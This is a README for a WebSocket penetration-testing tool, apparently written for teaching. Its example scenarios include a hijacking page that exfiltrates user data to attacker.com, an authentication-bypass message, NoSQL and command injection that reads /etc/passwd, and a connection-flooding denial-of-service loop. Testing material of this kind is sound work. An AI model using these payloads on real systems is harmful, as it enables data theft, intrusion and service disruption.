# WebSockets Pentest Tool

## What the Tool is For:
A comprehensive WebSocket security testing framework that identifies vulnerabilities in real-time communication channels, including authentication bypasses, message manipulation, DoS attacks, and protocol implementation flaws.

## About:
WebSockets enable full-duplex communication channels over a single TCP connection. This tool tests for security issues like unauthorized message injection, sensitive data exposure, CSRF over WebSockets, and protocol-level vulnerabilities.

## General Algorithm:
```
1. WebSocket Discovery & Handshake
   - Endpoint enumeration
   - Protocol version detection
   - Authentication mechanism analysis

2. Protocol Fuzzing & Testing
   - Message format fuzzing
   - Protocol compliance testing
   - Frame manipulation
   - Compression testing

3. Security Vulnerability Assessment
   - Authentication/authorization bypass
   - Message injection attacks
   - Sensitive data exposure
   - Cross-site WebSocket hijacking

4. Performance & Stability Testing
   - Resource exhaustion
   - Denial of Service vectors
   - Memory leak detection
   - Connection flooding

5. Reporting & Analysis
   - Vulnerability classification
   - Proof-of-concept exploits
   - Remediation guidance
```

## How to Run the Code:

### Python Version:
```bash
# Install dependencies
pip install websocket-client colorama

# Basic scan
python3 websocket_pentest.py https://example.com

# With custom headers
python3 websocket_pentest.py https://example.com --headers '{"Origin": "https://example.com"}'

# With custom endpoints
echo "wss://example.com/chat
wss://example.com/live" > endpoints.txt
python3 websocket_pentest.py https://example.com --endpoints endpoints.txt
```

### C Version:
```bash
# Install dependencies
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev

# Compile
gcc -o websocket_pentest websocket_pentest.c -lcurl -lssl -lcrypto -ljansson

# Run
./websocket_pentest example.com
```

## Example Test Scenarios:

### 1. Cross-Site WebSocket Hijacking (CSWSH):
```html
<!-- Malicious page on attacker.com -->
<script>
var ws = new WebSocket('wss://vulnerable-app.com/ws');
ws.onopen = function() {
    // Steal sensitive data through WebSocket
    ws.send('{"action": "getUserData"}');
};
ws.onmessage = function(event) {
    // Exfiltrate data to attacker server
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
};
</script>
```

### 2. Authentication Bypass:
```javascript
// Bypass authentication by sending manipulated auth object
var ws = new WebSocket('wss://app.com/ws');
ws.onopen = function() {
    ws.send('{"auth": {"bypass": true, "isAdmin": true}}');
};
```

### 3. Message Injection:
```javascript
// NoSQL injection through WebSocket
ws.send('{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}');

// Command injection
ws.send('{"action": "exec", "command": "cat /etc/passwd"}');
```

### 4. Denial of Service:
```javascript
// Resource exhaustion attack
for (let i = 0; i < 1000; i++) {
    let ws = new WebSocket('wss://target.com/ws');
    ws.onopen = () => {
        setInterval(() => {
            ws.send('A'.repeat(100000)); // Large messages
        }, 100);
    };
}
```

## Key Features:

1. **Comprehensive Discovery**: Automatic WebSocket endpoint discovery
2. **Protocol Testing**: Handshake validation, subprotocol testing
3. **Security Assessment**: Authentication bypass, injection attacks, CSWSH
4. **Performance Testing**: DoS detection, resource exhaustion
5. **Framework-Specific**: Socket.IO, SockJS, and other library testing
6. **Real-time Analysis**: Live message monitoring and analysis

## Educational Value:

This tool teaches students:
- WebSocket protocol security
- Real-time communication vulnerabilities
- Cross-site WebSocket hijacking
- Message injection techniques
- DoS attacks on persistent connections
- Authentication bypass methods
- Secure WebSocket implementation
